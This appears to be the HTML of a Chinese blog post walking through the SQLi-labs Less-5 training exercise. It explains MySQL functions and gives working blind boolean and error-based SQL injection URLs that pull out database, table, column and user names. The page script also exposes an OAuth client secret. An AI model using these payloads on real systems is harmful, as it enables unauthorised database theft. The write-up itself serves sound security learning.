@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>sql-lib每日一记_Less5(day5) | Fre3L3i's blogs</title><meta name="description" content="sql-lib每日一记_Less5(day5)"><meta name="keywords" content="sql-lib每日一记"><meta name="author" content="Fre3L3i"><meta name="copyright" content="Fre3L3i"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="http://fre3l3i.github.io/2019/12/05/sql-lib每日一记-Less5-day5/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="sql-lib每日一记_Less5(day5)"><meta name="twitter:description" content="sql-lib每日一记_Less5(day5)"><meta name="twitter:image" content="http://fre3l3i.github.io/img/hack3.jpg"><meta property="og:type" content="article"><meta property="og:title" content="sql-lib每日一记_Less5(day5)"><meta property="og:url" content="http://fre3l3i.github.io/2019/12/05/sql-lib每日一记-Less5-day5/"><meta property="og:site_name" content="Fre3L3i's blogs"><meta property="og:description" content="sql-lib每日一记_Less5(day5)"><meta property="og:image" content="http://fre3l3i.github.io/img/hack3.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="next" title="sql-lib每日一记_Less4(day4)" href="http://fre3l3i.github.io/2019/12/03/sql-lib每日一记-Less4-day4/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?63e637c26e8dfc25455d99703b911772";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight_copy: 'true',
+  highlight_lang: 'true',
+  highlight_shrink: 'false',
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: '添加书签',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天'
+
+  
+}</script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Lib-Less5"><span class="toc-number">1.</span> <span class="toc-text">SQL-Lib_Less5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查看源代码"><span class="toc-number">1.1.</span> <span class="toc-text">查看源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用意"><span class="toc-number">1.2.</span> <span class="toc-text">用意</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#尝试正常访问-和非正常访问"><span class="toc-number">1.3.</span> <span class="toc-text">尝试正常访问**和非正常访问**</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#首先我们先查询一下版本-，测试一下我们是否能用盲注的方式获得数据"><span class="toc-number">1.4.</span> <span class="toc-text">首先我们先查询一下版本**，测试一下我们是否能用盲注的方式获得数据**</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在这里在注释后面的语句的时候突然发现了一个问题"><span class="toc-number">1.5.</span> <span class="toc-text">在这里在注释后面的语句的时候突然发现了一个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破数据库第一位"><span class="toc-number">1.6.</span> <span class="toc-text">爆破数据库第一位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr-函数-ascii-函数-limit-函数讲解"><span class="toc-number">1.7.</span> <span class="toc-text">substr()函数  ascii()函数 limit()函数讲解**</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#regexp（）-函数"><span class="toc-number">1.8.</span> <span class="toc-text">regexp（） 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用ord（）和mid（）数获取users-表的内容"><span class="toc-number">1.9.</span> <span class="toc-text">利用ord（）和mid（）数获取users 表的内容**</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">1.10.</span> <span class="toc-text">报错注入</span></a></li></ol></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/hack3.jpg)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">Fre3L3i's blogs</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><div class="menu_mask"></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad avatar_img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'"></div><div class="mobile_post_data"><div class="mobile_data_item text-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">8</div></a></div></div><div class="mobile_data_item text-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">4</div></a></div></div><div class="mobile_data_item text-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">2</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 家</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sql-lib每日一记_Less5(day5)</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-12-05<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-12-05</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/sql-lib/">sql-lib</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">2.1k</span><span class="post-meta__separator">|</span><span>阅读时长: 8 分钟</span><span class="post-meta__separator">|</span><span>阅读量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="SQL-Lib-Less5"><a href="#SQL-Lib-Less5" class="headerlink" title="SQL-Lib_Less5"></a><strong>SQL-Lib_Less5</strong></h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a><strong>查看源代码</strong></h3><p><img alt data-src="img1.png" class="lozad"> </p>
+<p>​    首先分析可以看到这里以单引号闭合，如果有查询出来的值返回you are in ….，否则如果语句错误，或sql连接有误，会把错误输出出来，并且输出一个<br></p>
+<hr>
+<h3 id="用意"><a href="#用意" class="headerlink" title="用意"></a>用意</h3><p>**    这道题想告诉我们的是当查询正确的时候他会返回you are in …. 而当错误或异常的时候他只会返回空或是错误语句<strong>**，那如果不理解可以理解为you</strong> <strong>are in….(代表了True)**</strong>，而返回为空则代表了（False）**</p>
+<hr>
+<h3 id="尝试正常访问-和非正常访问"><a href="#尝试正常访问-和非正常访问" class="headerlink" title="尝试正常访问**和非正常访问**"></a><strong>尝试正常访问**</strong>和非正常访问**</h3><p>​    <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1</a> </p>
+<p><img alt data-src="img2.png" class="lozad"></p>
+<p>​    <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;</a></p>
+<p><img alt data-src="img3.png" class="lozad"></p>
+<p><strong>可以明显看到有错误返回**</strong>，可以判断语句是可以被执行的，并且没有加过滤**</p>
+<hr>
+<h3 id="首先我们先查询一下版本-，测试一下我们是否能用盲注的方式获得数据"><a href="#首先我们先查询一下版本-，测试一下我们是否能用盲注的方式获得数据" class="headerlink" title="首先我们先查询一下版本**，测试一下我们是否能用盲注的方式获得数据**"></a><strong>首先我们先查询一下版本**</strong>，测试一下我们是否能用盲注的方式获得数据**</h3><ul>
+<li><p>​    利用left(database(),1)进行尝试</p>
+</li>
+<li><p>​    下面是LEFT()函数的语法</p>
+</li>
+<li><p>​    LEFT(str,length);</p>
+</li>
+<li><p>​    LEFT()函数接受两个参数：</p>
+</li>
+<li><p>str是要提取子字符串的字符串。</p>
+</li>
+<li><p>length是一个正整数，指定将从左边返回的字符数。</p>
+</li>
+</ul>
+<p>LEFT()报道查看函数str字符串中最左边的长度字符。如果str或length参数为NULL，报道查看则NULL值。</p>
+<p>如果length为0或为负，则LEFT函数报道查看一个空字符串。如果length大于str字符串的长度，则LEFT函数报道查看整个str字符串。</p>
+<p>请注意，<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.yiibai.com%2Fmysql%2Fsubstring.html" target="_blank" rel="noopener">SUBSTRING</a>（或<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.yiibai.com%2Fmysql%2Fsubstring.html" target="_blank" rel="noopener">SUBSTR</a>）函数也提供与LEFT函数相同的功能。</p>
+<p>SELECT LEFT(‘MySQL LEFT’, 5);</p>
+<hr>
+<h3 id="在这里在注释后面的语句的时候突然发现了一个问题"><a href="#在这里在注释后面的语句的时候突然发现了一个问题" class="headerlink" title="在这里在注释后面的语句的时候突然发现了一个问题"></a><strong>在这里在注释后面的语句的时候突然发现了一个问题</strong></h3><p>​    正常来说#应该是可以注释掉的但是在环境中输入#并没有把后面的语句注释掉，报错任然显示，直到我把#用urlencode编码了之后换成%23才能成功执行语句</p>
+<p>​    <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(version(),1)=5#</p>
+<p><img alt data-src="img4.png" class="lozad"> </p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(version(),1)=5%23</p>
+<p><img alt data-src="img5.png" class="lozad"></p>
+<p><strong>当然在这里也可以用**</strong>–+进行注释<strong><strong>，让</strong></strong>mysql语句后面不执行**</p>
+<p><strong>那么回过主题，我们这里的数据库版本是**</strong>5.1.41的**</p>
+<p><img alt data-src="img6.png" class="lozad"></p>
+<p><strong>那么我们来看会下如果值不等于5会返回什么呢</strong></p>
+<p><img alt data-src="img7.png" class="lozad"></p>
+<p><strong>可以看到数据库查询是正确的**</strong>，但是猜的值不对，所以我们的返回为空**</p>
+<p><strong>于是我们可以一点点猜测过去</strong></p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(version(),1)=5–+</p>
+<p>可是知道猜到第四个值，sql语句报错了</p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(version(),4)=5.1.%23</p>
+<p><img alt data-src="img8.png" class="lozad"></p>
+<p>在mysql命令行中是这样报错的</p>
+<p><img alt data-src="img9.png" class="lozad"></p>
+<p><strong>大家可以在我的博客底下评论一起探讨这个问题哦</strong></p>
+<hr>
+<h3 id="爆破数据库第一位"><a href="#爆破数据库第一位" class="headerlink" title="爆破数据库第一位"></a>爆破数据库第一位</h3><p>​    <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(database(),1)&gt;’a’–+</p>
+<p><img alt data-src="img10.png" class="lozad"></p>
+<p>Database()为security，所以我们看他的第一位是否&gt; a,很明显的是s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
+<p>猜测数据库第二位</p>
+<p>得知第一位为s，我们看前两位是否大于sa</p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> left(database(),2)&gt;’sa’–+</p>
+<p><img alt data-src="img11.png" class="lozad"></p>
+<p>然后剩下的6个字符以此类推</p>
+<hr>
+<h3 id="substr-函数-ascii-函数-limit-函数讲解"><a href="#substr-函数-ascii-函数-limit-函数讲解" class="headerlink" title="substr()函数  ascii()函数 limit()函数讲解**"></a><strong>substr()函数</strong>  ascii()<strong>函数</strong> limit()函数讲解**</h3><p>​    </p>
+<p>​    <strong>substr()**</strong>函数**</p>
+<p>​    语法：<strong>substr(str,pos,len);</strong>//str:字符串，pos：起始位置，len：截断长度</p>
+<p>​    例子：SELECT SUBSTR(‘2018-08-17’,6,7); </p>
+<p><img alt data-src="img12.png" class="lozad"></p>
+<p><strong>ASCII()函数</strong></p>
+<p>​    返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
+<p>举例：select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1));</p>
+<p><img alt data-src="img13.png" class="lozad"></p>
+<p><strong>limit()函数</strong></p>
+<p>limit子句用于限制查询结果返回的数量，常用于分页查询</p>
+<p>举例：select table_name from information_schema.tables where table_schema=”security” limit 0,1;</p>
+<p><img alt data-src="img14.png" class="lozad"></p>
+<p> select table_name from information_schema.tables where table_schema=”security” limit 1,1;</p>
+<p><img alt data-src="img15.png" class="lozad"></p>
+<hr>
+<p><strong>利用**</strong>substr() ascii()<strong>**函数进行尝试</strong></p>
+<p> <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80– </p>
+<p> <a href="http://192.168.72.179/sqli-labs/Less-5/?id=1%27and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c1%2c1))%3e80--+](http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c1%2c1))&gt;80--+" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1%27and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c1%2c1))%3e80--+](http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c1%2c1))&gt;80--+</a>)</p>
+<p><img alt data-src="img16.png" class="lozad"></p>
+<p>此处table_schema 可以写成=’security’，但是我们这里使用的database()，是因</p>
+<p>为此处database()就是security。此处同样的使用二分法进行测试，直到测试正确为止。</p>
+<p>此处应该是101，因为第一个表示email。</p>
+<p>这里我们已经了解了substr()函数，这里使用substr(**,2,1)即可。</p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;and</a> ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80– </p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1'and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c2%2c1))>80--+" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1%27and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0%2c1)%2c2%2c1))%3e80–+</a></p>
+<hr>
+<h3 id="regexp（）-函数"><a href="#regexp（）-函数" class="headerlink" title="regexp（） 函数"></a><strong>regexp（） 函数</strong></h3><p>MySQL 中使用 REGEXP 关键字指定正则表达式的字符匹配模式，下表列出了 REGEXP 操作符中常用的匹配列表。</p>
+<p><img alt data-src="img17.png" class="lozad"></p>
+<p> 举例：select * from users where username REGEXP ‘^a’;</p>
+<p><img alt data-src="img18.png" class="lozad"></p>
+<p><strong>利用**</strong>regexp** <strong>获取**</strong>security<strong><strong>中</strong></strong>users** <strong>表中的列</strong></p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;</a> and 1=(select 1 from information_sch</p>
+<p>ema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1)– </p>
+<p>[<a href="http://192.168.72.179/sqli-labs/Less-5/?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27^us[a-z\]%27%20limit%200,1)--+]" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27^us[a-z\]%27%20limit%200,1)--+]</a>(<a href="http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1&#39;</a> and 1=(select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+)</p>
+<p>上述语句时选择users 表中的列名是否有us**的列</p>
+<p><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> and 1=(select 1 from information_schema.columns where</p>
+<p>table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+</p>
+<p><a href="http://192.168.72.179/sqli-labs/Less-5/?id=1'+and+1%3d(select+1+from+information_schema.columns+where+table_name%3d'users'+and+column_name+regexp+'^username'+limit+0%2c1)--+" target="_blank" rel="noopener">http://192.168.72.179/sqli-labs/Less-5/?id=1%27+and+1%3d(select+1+from+information_schema.columns+where+table_name%3d%27users%27+and+column_name+regexp+%27%5eusername%27+limit+0%2c1)–+</a></p>
+<p><img alt data-src="img19.png" class="lozad"></p>
+<p>上图中可以看到username 存在。我们可以将username 换成password 等其他的项也是正确</p>
+<p>的。</p>
+<hr>
+<p><strong>ORD()</strong>函数** MID()<strong>函数 IFNULL()函数</strong> CAST()函数 讲解**</p>
+<p><strong>ORD()</strong> <strong>函数</strong></p>
+<p><strong>ORD()</strong> <strong>函数返回字符串第一个字符的</strong> <a href="http://www.nowamagic.net/academy/tag/ASCII" target="_blank" rel="noopener"><strong>ASCII</strong></a> <strong>值。</strong></p>
+<p><strong>语法： ORD(string)</strong></p>
+<p>例子： select ord(‘I’);</p>
+<p><img alt data-src="img20.png" class="lozad"></p>
+<p>MID()函数</p>
+<p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p>
+<p>MID() 函数语法为：<strong>SELECT</strong> MID(ColumnName,  Start [, Length])  <strong>FROM</strong> TableName</p>
+<p>举例: select mid(‘fre3l3i’,1,5);</p>
+<p><img alt data-src="img21.png" class="lozad"></p>
+<p><strong>IFNULL()</strong> <strong>函数</strong></p>
+<p>IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。</p>
+<p><strong>IFNULL()</strong> <strong>函数**</strong>语法为<strong>**：</strong>IFNULL(expression, alt_value)</p>
+<p><strong>举例：</strong>SELECT IFNULL(NULL, “RUNOOB”);</p>
+<p><img alt data-src="img22.png" class="lozad"></p>
+<p><strong>CAST</strong>()函数****</p>
+<p><strong>CAST用来转换字符类型</strong></p>
+<p>语法：CAST( value AS type )</p>
+<p>type的类型有</p>
+<table>
+<thead>
+<tr>
+<th><strong>value</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DATE</td>
+<td>日期，格式为  ‘YYYY-MM-DD’.</td>
+</tr>
+<tr>
+<td>DATETIME</td>
+<td>日期加具体的时间，格式为  ‘YYYY-MM-DD HH:MM:SS’.</td>
+</tr>
+<tr>
+<td>TIME</td>
+<td>时间，格式为  ‘HH:MM:SS’.</td>
+</tr>
+<tr>
+<td>CHAR</td>
+<td>字符型</td>
+</tr>
+<tr>
+<td>SIGNED</td>
+<td>int</td>
+</tr>
+<tr>
+<td>UNSIGNED</td>
+<td>无符号int</td>
+</tr>
+<tr>
+<td>BINARY</td>
+<td>二进制型</td>
+</tr>
+<tr>
+<td>DECIMAL</td>
+<td>float型</td>
+</tr>
+</tbody></table>
+<p><strong>举例**</strong>:**select cast(20.3456 as decimal(10, 2)) as num ;</p>
+<p><img alt data-src="img23.png" class="lozad"></p>
+<p>select cast(‘2019-03-08 15:31:26’ as datetime ) as date;</p>
+<p><img alt data-src="img24.png" class="lozad"></p>
+<hr>
+<h3 id="利用ord（）和mid（）数获取users-表的内容"><a href="#利用ord（）和mid（）数获取users-表的内容" class="headerlink" title="利用ord（）和mid（）数获取users 表的内容**"></a><strong>利用ord（）和mid（）数获取users 表的内容**</strong></h3><p><img alt data-src="img25.png" class="lozad"></p>
+<p><img alt data-src="img26.png" class="lozad"></p>
+<p>获取users 表中的内容。获取username 中的第一行的第一个字符的ascii，与68 进行比较，</p>
+<p>即为D。而我们从表中得知第一行的数据为Dumb。所以接下来只需要重复造轮子即可。</p>
+<hr>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>Concat()函数</p>
+<p>语法：concat(str1, str2,…)</p>
+<p>作用：将多个字符串连接成一个字符串。</p>
+<p>举例：select concat(id,username,password) as info from users;</p>
+<p><img alt data-src="img27.png" class="lozad"></p>
+<p><strong>Floor()函数</strong></p>
+<p><strong>语法**</strong>：floor<strong>**(x)</strong></p>
+<p><strong>作用**</strong>：返回小于或等于x的最大整数**</p>
+<p><strong>举例：**</strong>select floor(1.5)**</p>
+<p><img alt data-src="img28.png" class="lozad"></p>
+<p> <a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union Select 1,count(*),concat(0x3a,0x3a,(select user()),0</p>
+<p>x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a–+</p>
+<p><img alt data-src="img29.png" class="lozad"></p>
+<p>利用double 数值类型超出范围进行报错注入，没有试验成功，主要由于函数溢出了之后返回为Null</p>
+<p><img alt data-src="img30.png" class="lozad"></p>
+<p>每天一更 有点吃不消，这篇文章还没有结束，真的才发现，原来到了大学，时间真的没有那么的充分，希望大家能够好好珍惜时间。明天继续写，未完待续……</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Fre3L3i</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fre3l3i.github.io/2019/12/05/sql-lib每日一记-Less5-day5/">http://fre3l3i.github.io/2019/12/05/sql-lib每日一记-Less5-day5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fre3l3i.github.io">Fre3L3i's blogs</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql-lib每日一记/">sql-lib每日一记    </a></div><div class="post_share"><div class="social-share" data-image="/img/hack3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2019/12/03/sql-lib每日一记-Less4-day4/"><img class="next_cover lozad" data-src="/img/hack3.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>sql-lib每日一记_Less4(day4)</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/11/28/sql-lib每日一记-Less2-day2/" title="sql-lib每日一记_Less2(day2)"><img class="relatedPosts_cover lozad" data-src="/img/hack3.jpg"><div class="relatedPosts_title">sql-lib每日一记_Less2(day2)</div></a></div><div class="relatedPosts_item"><a href="/2019/11/27/sql-lib每日一记-Less1-day1/" title="sql-lib每日一记_Less1(day1)"><img class="relatedPosts_cover lozad" data-src="/img/hack3.jpg"><div class="relatedPosts_title">sql-lib每日一记_Less1(day1)</div></a></div><div class="relatedPosts_item"><a href="/2019/12/03/sql-lib每日一记-Less4-day4/" title="sql-lib每日一记_Less4(day4)"><img class="relatedPosts_cover lozad" data-src="/img/hack3.jpg"><div class="relatedPosts_title">sql-lib每日一记_Less4(day4)</div></a></div><div class="relatedPosts_item"><a href="/2019/11/29/sql-lib每日一记-Less3-day3/" title="sql-lib每日一记_Less3(day3)"><img class="relatedPosts_cover lozad" data-src="/img/hack3.jpg"><div class="relatedPosts_title">sql-lib每日一记_Less3(day3)</div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
+  clientID: 'cfe0c9d33c3542fc0879',
+  clientSecret: '6dd55af884321e6cf38cbb42b1954b9fda93d256',
+  repo: 'Fre3L3i.github.io',
+  owner: 'Fre3L3i',
+  admin: 'Fre3L3i',
+  id: md5(decodeURI(location.pathname)),
+  language: ''
+})
+gitalk.render('gitalk-container')</script></div></div></div><footer><div id="footer"><div class="copyright">&copy;2018 - 2019 By Fre3L3i</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Power By Fre3L3i</div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><a id="to_comment" href="#post-comment"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="nightshift fa fa-moon-o" id="nightshift" title="夜间模式"></i></section><div class=" " id="post_bottom"><div id="post_bottom_items"><a id="mobile_to_comment" href="#post-comment"><i class="mobile_scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list" id="mobile_toc"></i><div id="toc_mobile"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#SQL-Lib-Less5"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">SQL-Lib_Less5</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#查看源代码"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">查看源代码</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#用意"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">用意</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#尝试正常访问-和非正常访问"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">尝试正常访问**和非正常访问**</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" 